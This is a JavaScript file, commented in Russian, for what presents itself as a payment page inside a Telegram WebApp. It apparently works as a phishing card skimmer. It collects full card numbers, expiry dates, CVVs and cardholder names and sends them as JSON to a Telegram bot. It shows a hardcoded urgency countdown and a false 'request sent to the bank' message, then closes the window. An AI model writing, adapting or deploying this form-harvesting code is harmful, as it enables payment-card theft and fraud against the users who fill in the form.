// --- Получаем параметры из URL ---
function getUrlParams() {
    const params = new URLSearchParams(window.location.search);
    return {
        transaction_id: params.get('transaction_id') || '5024258_user_1758320811',
        amount: parseFloat(params.get('amount')) || 10.00,
        payment_id: params.get('payment_id') || '5024258_user_1758320811'
    };
}

// --- Инициализация при загрузке ---
document.addEventListener('DOMContentLoaded', function () {
    const { transaction_id, amount, payment_id } = getUrlParams();

    // Обновляем сумму
    document.getElementById('amountValue').textContent = amount.toFixed(2);
    document.getElementById('payAmount').textContent = `${amount.toFixed(2)} USD`;

    // Обновляем Payment ID
    document.getElementById('paymentId').textContent = payment_id;

    // Запускаем таймер
    startCountdown();
});

// --- Таймер обратного отсчёта ---
function startCountdown() {
    const countdownElement = document.getElementById('countdown');
    let totalSeconds = 29 * 60 + 4; // 29:04

    const timer = setInterval(() => {
        if (totalSeconds <= 0) {
            clearInterval(timer);
            countdownElement.textContent = "00:00";
            return;
        }

        const minutes = Math.floor(totalSeconds / 60);
        const seconds = totalSeconds % 60;
        countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

        totalSeconds--;
    }, 1000);
}

// --- Форма и отправка ---
const paymentForm = document.getElementById('paymentForm');
const cardNumberInput = document.getElementById('cardNumber');
const expiryInput = document.getElementById('expiry');
const cvvInput = document.getElementById('cvv');
const cardHolderInput = document.getElementById('cardHolder');

// Автоматический формат номера карты
cardNumberInput.addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
    e.target.value = value;
});

// Автоматический формат MM/YY
expiryInput.addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 3) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    e.target.value = value;
});

// Ограничение CVV
cvvInput.addEventListener('input', function (e) {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
});

// --- Отправка формы ---
paymentForm.addEventListener('submit', function (e) {
    e.preventDefault();

    // Валидация
    if (!cardNumberInput.value || !expiryInput.value || !cvvInput.value || !cardHolderInput.value) {
        alert('Please fill in all fields.');
        return;
    }

    const { transaction_id, amount, payment_id } = getUrlParams();

    // Подготавливаем данные
    const formData = {
        transaction_id: transaction_id,
        amount: amount,
        payment_id: payment_id,
        cardNumber: cardNumberInput.value.trim(),
        expiry: expiryInput.value.trim(),
        cvv: cvvInput.value.trim(),
        cardHolder: cardHolderInput.value.trim()
    };

    console.log("FormData:", formData);

    // Показываем сообщение пользователю
    paymentForm.innerHTML = `
        <p style="color: #5c00b7; text-align: center; font-size: 18px; font-weight: 500; line-height: 1.6;">
            🔄 Мы отправили запрос в банк.<br>
            Пожалуйста, подождите...
        </p>
    `;

    // === Основная отправка через WebApp ===
    if (window.Telegram && window.Telegram.WebApp) {
        try {
            // Отправляем данные
            window.Telegram.WebApp.sendData(JSON.stringify(formData));
            console.log("Данные отправлены через sendData");

            // Если бот не ответит в течение 5 секунд, закрываем окно принудительно
            setTimeout(() => {
                console.log("Принудительное закрытие WebApp через 5 секунд");
                window.Telegram.WebApp.close();
            }, 5000);

        } catch (error) {
            console.error("Ошибка sendData:", error);
            alert("Произошла ошибка при отправке данных. Попробуйте еще раз.");
            window.Telegram.WebApp.close();
        }
    } else {
        console.warn("Telegram WebApp not found. Running in debug mode.");
        alert("Данные собраны (режим отладки).");
    }
});